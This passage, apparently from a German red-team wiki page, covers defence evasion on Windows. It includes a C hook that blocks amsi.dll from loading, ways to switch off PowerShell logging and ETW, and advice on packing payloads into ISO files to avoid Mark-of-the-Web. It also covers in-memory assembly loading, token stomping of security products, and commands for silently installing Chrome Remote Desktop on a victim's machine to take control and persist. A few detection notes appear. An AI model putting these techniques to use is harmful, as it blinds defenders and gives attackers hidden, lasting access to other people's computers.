NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notizen
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loadern (alle, die andernfalls AMSI laden würden).
- In Kombination mit der Übergabe von Skripten über stdin verwenden (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Befehlszeilen-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen durch randomisierte benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeiden und die Groß-/Kleinschreibung von PowerShell-Schlüsselwörtern zufällig variieren, um Signaturen zu umgehen.

**Erkannte Signatur entfernen**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Anweisungen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn du PowerShell-Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ohne AMSI-Scan ausführen kannst. So geht's:

```bash
powershell.exe -version 2
```

## PS-Protokollierung

Die PowerShell-Protokollierung ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um die PowerShell-Protokollierung zu umgehen, kannst du folgende Techniken verwenden:

- **PowerShell-Transkription und Modulprotokollierung deaktivieren**: Zu diesem Zweck kannst du ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen. Daher kannst du deine Skripte ausführen, ohne dass sie von AMSI gescannt werden. Das geht so: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strikes `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Schutzmaßnahmen werden dadurch jedoch nicht grundsätzlich deaktiviert; der Schutzumfang hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten, wodurch die Entropie der Binärdatei steigt und AVs und EDRs sie leichter erkennen können. Sei dabei vorsichtig und wende Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Ablauf stellt zuverlässig einen nahezu **originalgetreuen IL-Code wieder her**, der anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenkörper* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binärdatei führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen und Kontrollfluss – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-Call-Entfernung – ConfuserEx ersetzt direkte Methodenaufrufe durch einfache Wrapper (auch *Proxy-Calls* genannt), um die Dekompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führen Sie die resultierende Binärdatei unter dnSpy aus und suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *echte* Payload zu finden. Oft speichert die Malware es als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Diese Kette stellt den Ausführungsfluss wieder her, **ohne** das bösartige Sample ausführen zu müssen – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC zur automatischen Triage von Samples verwendet werden kann.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für erhöhte Softwaresicherheit sorgt.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie sich die Sprache `C++11/14` verwenden lässt, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne externe Tools zu verwenden oder den Compiler zu ändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogrammierungs-Framework erzeugt werden und es Personen, die die Anwendung knacken wollen, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für feingranulare Code-Obfuscation für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem es reguläre Instruktionen in ROP-Ketten umwandelt und so unsere natürliche Vorstellung von normalem Kontrollfluss durchkreuzt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

### LLVM-Compiler-gestütztes Self-Masking pro Funktion

Anstatt ein gesamtes Implantat nur während des Schlafens zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen XOR-maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, injiziert positionsunabhängige Entry-/Exit-Stubs um den finalen Maschinencode und gibt einen gemeinsamen Maskierungshandler in `.text` aus; Signaturen auf Quelltextebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Kontrollfluss-Transformation im Backend

Dies gehört nach die Instruktionsauswahl und Optimierung, da die Transformation **jeden ausgegebenen Return** erfassen und das genaue x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Ausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, sodass der letzte Pfad in den angehängten Epilog übergeht, und ersetzt frühere Returns durch `JMP_1 handler`. Behalte alle vom Compiler generierten Stack-/Frame-Abbauinstruktionen vor jedem Return bei; leite nur die Return-Instruktion selbst um.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die funktionsspezifischen Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die zwischen den Ausgabestufen gemeinsam genutzt werden, ermöglichen es einem Prolog-Branch, auf seinen später ausgegebenen Epilog zu verweisen. Für ein manuell ausgegebenes nahes `je` schreibe `0F 84`, gefolgt vom vier Byte großen MC-Ausdruck `target - address_after_je`. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte (`CALL64pcrel32` und `JMP_1`) ausgegeben werden. Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt auf diesem Pfad fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Initialisierung vor dem CRT

Der PoC legt einen XOR-Schlüssel und 16 Byte große Datensätze in `.funcmeta` ab, die einen vom Loader relocatierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler an Datensatz-Offset `+8` auf ein QWORD zu und liest dabei die Länge samt Padding; anschließend rückt er die Datensätze jeweils um `0x10` weiter. PE-Abschnittsnamen sind nur acht Byte lang, daher sieht die Laufzeitabfrage `.funcmet`. Ein externer Patcher fügt einen ausführbaren Abschnitt `.stub` hinzu, speichert die ursprüngliche Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ermittelt die Image Base über `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um ein bereits importiertes `VirtualProtect` aufzulösen, und wird vor dem CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Die Initialisierung setzt einen Sentinel in `gs:[0xE8]` und ruft jede Metadatenfunktion auf. Ihr dauerhaft lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch nicht maskierten Funktionsrumpf. Der Epilog verwendet dann `call handler`; nachdem der Handler 13 Register (`0x68` Byte) gesichert hat, ist die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion, sodass `end - start` in ihren Metadatensatz geschrieben werden kann. Der Stub löscht den Sentinel und springt nach der Maskierung aller Funktionsrümpfe zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Funktionsrumpf zu decodieren. Der letzte Pfad geht in den angehängten Epilog über, während jeder frühere Return direkt zum gemeinsamen Handler springt. Der normale Epilog verwendet ebenfalls `jmp handler` statt `call`, sodass nach dem erneuten Maskieren das `ret` des Handlers die Rücksprungadresse des ursprünglichen Aufrufers verwendet und das Funktionsergebnis in `RAX` erhält.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler findet den aktuellen Datensatz, überspringt den festgelegten sichtbaren Prolog (in diesem Build `0x46` Byte), ändert den Schutz des Rests in `PAGE_EXECUTE_READWRITE`, XORt ihn Byte für Byte mit dem niederwertigen Schlüsselbyte und setzt den Schutz dann auf `PAGE_EXECUTE_READ`. Dieselbe Schleife decodiert also beim Eintritt und encodiert bei jedem normalen Funktionsende.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub`-Abschnitts und ein `.funcmet`-Abschnitt mit einem Schlüssel sowie relocatierten `.text`-Zeigern;
- PEB-, Importtabellen- und Abschnittstabellen-Parsing vor dem CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische `call`/`pop`-PIC-Prologe und zahlreiche Return-Stellen, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen in ausführbare, vom Image unterstützte Seiten.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen unverschlüsselten Funktionsrumpf, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion dumpen. Das Ein-Byte-XOR, die lesbaren Metadaten und die feste Grenze `0x46` machen außerdem eine Offline-Wiederherstellung einfach.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadspezifisch, die modifizierten Code-Seiten jedoch prozessweit. Gleichzeitige oder rekursive Aufrufe können daher Instruktionen erneut umschalten, während eine andere Ausführung sie gerade verwendet; auch Ausnahmen und nichtlokale Exits können das erneute Maskieren umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den tatsächlich über `lpflOldProtect` zurückgegebenen Schutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf x64-Stack-Alignment prüfen und nach dem Umschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft weist ausdrücklich darauf hin, dass der Aufrufer für die Konsistenz des Instruktionscaches verantwortlich ist, wenn ausführbarer Code geändert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht hast du diesen Bildschirm schon einmal gesehen, wenn du ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen basiert hauptsächlich auf einem Reputationsansatz. Daher lösen selten heruntergeladene Anwendungen SmartScreen aus, wodurch der Endbenutzer gewarnt und daran gehindert wird, die Datei auszuführen (die Datei kann jedoch weiterhin ausgeführt werden, indem man auf More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und auch die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig zu beachten ist, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert wurden, **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass deine Payloads den Mark of The Web erhalten, ist, sie in einem Container wie einer ISO-Datei zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container verpackt, um den Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Protokollierungsmechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ETW jedoch auch dazu verwenden, bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, lässt sich auch die Funktion **`EtwEventWrite`** des User-Space-Prozesses so ändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt und die ETW-Protokollierung für diesen Prozess effektiv deaktiviert.

Weitere Informationen finden Sie unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Das Laden von C#-Binärdateien in den Speicher ist schon seit geraumer Zeit bekannt und nach wie vor eine sehr gute Möglichkeit, post-exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Methoden:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, der bösartigen post-exploitation-Code injiziert und ausführt. Anschließend wird der neue Prozess beendet. Diese Methode hat sowohl Vorteile als auch Nachteile. Ihr Vorteil ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass die **Wahrscheinlichkeit deutlich höher ist**, dass unser **Implant überlebt**, falls bei unserer post-exploitation-Aktion etwas schiefgeht oder sie entdeckt wird. Der Nachteil ist, dass die **Wahrscheinlichkeit höher ist**, von **verhaltensbasierten Erkennungsmechanismen** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige post-exploitation-Code **in den eigenen Prozess** injiziert. So muss kein neuer Prozess erstellt werden, der anschließend von AV gescannt werden könnte. Der Nachteil: Falls bei der Ausführung Ihrer Payload etwas schiefgeht, ist die **Wahrscheinlichkeit deutlich höher**, dass Sie Ihren **Beacon verlieren**, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn Sie mehr über das Laden von C#-Assemblies erfahren möchten, lesen Sie diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sehen Sie sich den InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Sie können C#-Assemblies auch **aus PowerShell** laden. Sehen Sie sich [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Bei normalen `execute-assembly`-Techniken bleiben erkennbare MSIL erhalten, und schließlich wird eine CLR initialisiert. **WasmForge** ändert stattdessen die Ausführungsumgebung: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet dieses Modul in einen Windows-PE-Host auf Wazero-Basis ein. Der resultierende Prozess benötigt weder die CLR des Ziels noch JIT oder den `dotnet`-Host. Regeln, die ausschließlich auf verwalteten Assembly-Namen, dem Laden der CLR, AMSI oder .NET ETW basieren, haben daher keinen direkten Einblick mehr. Dies ist eine Umgehungs-/Verpackungstechnik, kein Umgehen einer Privilegiengrenze – der Gastprozess behält die Berechtigungen und das beobachtbare OS-Verhalten des ursprünglichen Tools bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Ein C#-Projekt erstellen

Der empfohlene Build-Weg ist die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, WASI SDK 24.0, den Linker und die Abhängigkeiten zum Signieren enthält. Eine `.csproj`-Datei wird automatisch erkannt; der Build in einem Schritt übernimmt die Migration, Kompatibilitätsanpassung, WASM-Kompilierung, das Erstellen der PE-Datei und das Signieren.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Zur Fehlerbehebung oder Überprüfung des generierten Codes unterteilen Sie den Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und abschließend `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Komponentenkodierung zu umgehen und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Überbrückung von wasm32-C# zu x64-Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI fehlen Windows-orientierte BCL-Funktionen oder sie verhalten sich anders, und ein wasm32-Gast reserviert normalerweise vier Byte große Zeigerslots, während x64-APIs acht Byte große Zeiger zurückgeben können. WasmForge begegnet beiden Problemen mit den folgenden generierten Schichten:<sup>[[44]](#references)</sup>

1. Ein Quellcode-Patcher behebt AOT-spezifische semantische Unterschiede und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und ähnliche Funktionen an `Wf*`-Hilfsfunktionen um.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Zuordnungen, sodass `[DllImport]`-Aufrufe an verknüpfte C-Bridge-Symbole gebunden werden, anstatt die angegebene DLL dynamisch im Gast zu laden.
3. Hostgebundene Zeiger verwenden in C# `ulong` und in C `uint64_t`. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; eine `out8_mask` kennzeichnet echte acht Byte große Ausgabeslots, deren obere Hälften erhalten bleiben müssen. Bei nicht markierten Ausgaben im wasm32-Format wird ein Snapshot-/Restore-Schutz verwendet, damit ein x64-Schreibvorgang die benachbarten vier Byte nicht beschädigt.
4. Dedizierte Host-Bridges verarbeiten Vorgänge, die sich nicht für den generischen Syscall-Dispatch eignen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Verkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Host-Adressen und setzt die Bits 2 und 3 (`0xC`), da der Wertzeiger und die Länge acht Byte große Ausgabeslots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übersetzt die Zeiger und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Detection-Pivots

Code mit umfangreicher Reflection, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin tool-spezifische Patches erfordern oder vollständig fehlschlagen. Generische WASI-Preview-2-Sockets können ebenfalls No-op-Stubs erreichen, weshalb unterstützte Tools protokollspezifische Host-Shims verwenden. Überprüfe jeden Befehl anhand eines nativen Builds, statt von Feature-Parität auszugehen.<sup>[[44]](#references)[[45]](#references)</sup>

Die Technik verlagert Telemetrie, anstatt das Payload unsichtbar zu machen. Die Detection kann sich auf eine PE-Datei verlagern, die ein WASM-Modul enthält oder materialisiert, auf ein Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Speicherzuweisungen und -kopiervorgänge zwischen Host und Guest, generischen direkten Win32-Dispatch, Anomalien bei Signaturen und PE-Ressourcen sowie die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Fehlen von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gelten, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code in anderen Sprachen auszuführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Indem du Zugriff auf die Interpreter-Binärdateien und die Umgebung auf der SMB-Freigabe gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Laut Repository scannt Defender die Skripte weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly-Rehosting zur Umgehung statischer Analyse

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie eines EDR oder AV. Werden die Berechtigungen des Tokens verringert, kann der Prozess weiterlaufen, während er daran gehindert wird, privilegierte Inspektions- oder Behebungsmaßnahmen durchzuführen.

Um dies zu verhindern, könnte Windows **externe Prozesse daran hindern**, Handles für die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend verwenden, um die Kontrolle darüber zu übernehmen und Persistenz zu erreichen:<sup>[[35]](#references)</sup>
1. Lade das Programm von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm auf dem Rechner des Opfers im Hintergrund aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehe zurück zur Chrome-Remote-Desktop-Seite und klicke auf „Next“. Der Assistent fordert dich dann zur Autorisierung auf. Klicke auf „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).
 

## Fortgeschrittene Umgehungstechniken

{{#ref}}
